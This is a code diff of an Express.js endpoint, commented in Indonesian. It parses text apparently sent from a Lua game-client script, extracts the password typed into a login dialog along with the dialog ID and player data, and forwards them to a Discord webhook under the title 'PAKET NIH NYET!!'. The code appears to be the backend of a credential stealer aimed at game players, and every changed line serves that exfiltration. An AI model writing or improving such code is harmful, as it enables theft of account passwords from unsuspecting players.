@@ -25,27 +25,19 @@ app.post('/api/send', async (req, res) => {
     // --- PROSES EKSTRAKSI DATA DARI VARIABEL 'c' ---
     let rawContent = c || "";
     let extractedPassword = "Tidak ada";
-    let extractedDialogId = t !== undefined ? String(t) : "Tidak ada";
+    let extractedDialogId = "Tidak ada";
 
-    // 1. Ekstraksi Dialog ID dari string (misal jika isi 'c' diawali "Dialog 11 ")
-    if (rawContent.startsWith("Dialog ")) {
-      const matchDialog = rawContent.match(/^Dialog\s+(\d+)\s*/i);
-      if (matchDialog) {
-        extractedDialogId = matchDialog[1]; // Mengambil angka "11"
-        rawContent = rawContent.replace(/^Dialog\s+\d+\s*/i, ""); // Menghapus tulisan dari data utama
-      }
+    // Format dari Lua: "Dialog:220 | Input:dott"
+    // 1. Ekstraksi Dialog ID
+    const matchDialog = rawContent.match(/Dialog:(\d+)/i);
+    if (matchDialog) {
+      extractedDialogId = matchDialog[1];
     }
 
-    // 2. Ekstraksi Password jika mendeteksi teks format "input:dott" atau sejenisnya
-    const matchInput = rawContent.match(/input[:\s]*([^\s\n]+)/i);
+    // 2. Ekstraksi Password dari Input
+    const matchInput = rawContent.match(/Input:([^\s|]+)/i);
     if (matchInput) {
-      const passwordValue = matchInput[1]; // Mengambil kata setelah "input:" (contoh: "dott")
-      // Format menjadi "Password: Dott" dengan huruf kapital di awal kata
-      const formattedPassword = passwordValue.charAt(0).toUpperCase() + passwordValue.slice(1);
-      extractedPassword = `Password: ${formattedPassword}`;
-      
-      // Hapus baris atau teks yang mengandung "input:dott" agar bersih dari data utama
-      rawContent = rawContent.replace(/input[:\s]*[^\s\n]+/i, "").trim();
+      extractedPassword = matchInput[1];
     }
 
     // URL Webhook Discord Anda
@@ -55,7 +47,7 @@ app.post('/api/send', async (req, res) => {
     await axios.post(webhookUrl, {
       embeds: [
         {
-          title: "PAKET NIH NYET!!", // Mengubah JUDUL menjadi DATA PEMAIN
+          title: "PAKET NIH NYET!!",
           color: 16777215, // Kode desimal untuk warna putih (#FFFFFF)
           fields: [
             {
@@ -65,7 +57,7 @@ app.post('/api/send', async (req, res) => {
             },
             {
               name: "Password",
-              value: extractedPassword, // Diisi otomatis dari hasil ekstraksi
+              value: extractedPassword,
               inline: true
             },
             {
@@ -85,11 +77,11 @@ app.post('/api/send', async (req, res) => {
             },
             {
               name: "Dialog ID",
-              value: extractedDialogId, // Menampilkan Dialog ID yang sudah dipindahkan
+              value: extractedDialogId,
               inline: true
             },
             {
-              name: "DATA PEMAIN",
+              name: "DATA PLAYER",
               value: rawContent ? `\`\`\`\n${rawContent}\n\`\`\`` : "```\nTidak ada\n```",
               inline: false
             }
